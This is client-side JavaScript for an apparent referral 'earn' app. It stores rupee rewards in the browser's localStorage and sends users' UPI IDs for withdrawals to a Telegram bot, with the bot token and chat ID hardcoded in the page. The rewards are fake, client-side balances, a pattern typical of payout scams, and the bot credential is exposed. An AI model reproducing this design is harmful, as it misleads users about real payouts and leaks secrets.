<script>
    let refBalance = 0;
    let totalRefers = 0;
    
    const BOT_TOKEN = '8721866580:AAHeD0Jrzbs6n1UzxXwUq4rrz8XvnRG3AsQ';
    const CHAT_ID = '-1003966977699';
    
    function showToast(msg, type = 'success'){
        let t = document.getElementById('toast');
        t.innerText = msg;
        t.className = 'toast ' + type;
        t.style.display = 'block';
        setTimeout(() => t.style.display = 'none', 3000);
    }

    function getDeviceId(){
        let deviceId = localStorage.getItem('ruppy_device_id');
        if(!deviceId){
            deviceId = 'dev_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            localStorage.setItem('ruppy_device_id', deviceId);
        }
        return deviceId;
    }

    function loadData(){
        refBalance = parseInt(localStorage.getItem('ruppy_ref_balance') || '0');
        totalRefers = parseInt(localStorage.getItem('ruppy_total_refers') || '0');
        
        document.getElementById('refBalance').innerText = refBalance;
        document.getElementById('yourRefers').innerText = totalRefers + ' Refer';
        
        checkUsedBills();
    }
    
    window.onload = function() {
        loadData();
        getDeviceId();
    }

    function showPage(pageId, element) {
        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
        document.getElementById(pageId).classList.add('active');
        if(element) element.classList.add('active');
    }

    function copyCode() {
        navigator.clipboard.writeText(document.getElementById('myReferCode').innerText);
        showToast('Refer Code Copied! Share with friends');
    }

    function applyRefer() {
        if(localStorage.getItem('ruppy_used_refer_code')){
            showToast('You already used a refer code on this device', 'error');
            return;
        }

        let code = document.getElementById('friendCode').value.trim();
        if(code.length < 3) { 
            showToast('Enter valid code', 'error'); 
            return; 
        }

        if(code === document.getElementById('myReferCode').innerText){
            showToast('Cannot use your own code', 'error');
            return;
        }

        refBalance += 5;
        document.getElementById('refBalance').innerText = refBalance;
        localStorage.setItem('ruppy_ref_balance', refBalance);
        localStorage.setItem('ruppy_used_refer_code', code);
        
        showToast('Success! ₹5 Added to Referral Balance', 'success');
        document.getElementById('friendCode').value = '';
    }

    function openBill(amount) {
        if(amount!= 1 && amount!= 3){
            showToast('This Bill is currently locked', 'error');
            return;
        }

        let today = new Date().toDateString();
        let lastClick = localStorage.getItem(`bill_${amount}_date`);

        if(lastClick === today){
            showToast('This Bill is already opened today. Try tomorrow', 'info');
            return;
        }

        refBalance += amount;
        document.getElementById('refBalance').innerText = refBalance;
        localStorage.setItem('ruppy_ref_balance', refBalance);

        localStorage.setItem(`bill_${amount}_date`, today);
        document.getElementById(`bill${amount}`).classList.add('used');
        document.getElementById(`bill${amount}`).classList.remove('active');

        showToast(`Congrats! ₹${amount} Added to Referral Balance`, 'success');
    }

    function checkUsedBills(){
        let today = new Date().toDateString();
        if(localStorage.getItem('bill_1_date') === today){
            let b1 = document.getElementById('bill1');
            if(b1) { b1.classList.add('used'); b1.classList.remove('active'); }
        }
        if(localStorage.getItem('bill_3_date') === today){
            let b3 = document.getElementById('bill3');
            if(b3) { b3.classList.add('used'); b3.classList.remove('active'); }
        }
    }

    async function requestWithdraw() {
        let upi = document.getElementById('upiId').value.trim();
        let btn = document.querySelector('#withdrawPage .btn-green');
        
        if(refBalance < 20) {
            showToast('Minimum ₹20 required', 'error'); 
            return;
        }
        if(!upi.includes('@')) {
            showToast('Enter valid UPI ID', 'error'); 
            return;
        }
        
        btn.disabled = true;
        btn.textContent = 'Processing...';
        
        let deviceId = getDeviceId();
        const telegramMessage = `✅ New Withdrawal Request\n\n💰 Amount: ₹20\n📱 UPI: ${upi}\n📲 Device: ${deviceId.substr(0,8)}\n⏰ Time: ${new Date().toLocaleString('en-IN')}\n\n👤 Status: Pending\n🚀 Ruppy Earn App`;
        
        try {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: telegramMessage
                })
            });
            
            const data = await response.json();
            
            if (data.ok) {
                refBalance -= 20;
                document.getElementById('refBalance').innerText = refBalance;
                localStorage.setItem('ruppy_ref_balance', refBalance);
                
                showToast('Withdraw Sent! Check Telegram ✅', 'success');
                document.getElementById('upiId').value = '';
                setTimeout(() => showPage('homePage'), 1500);
            } else {
                showToast('Telegram Error!', 'error');
            }
        } catch (error) {
            showToast('Network Error!', 'error');
        }
        
        btn.disabled = false;
        btn.textContent = 'Request ₹20 Withdraw';
    }
</script>
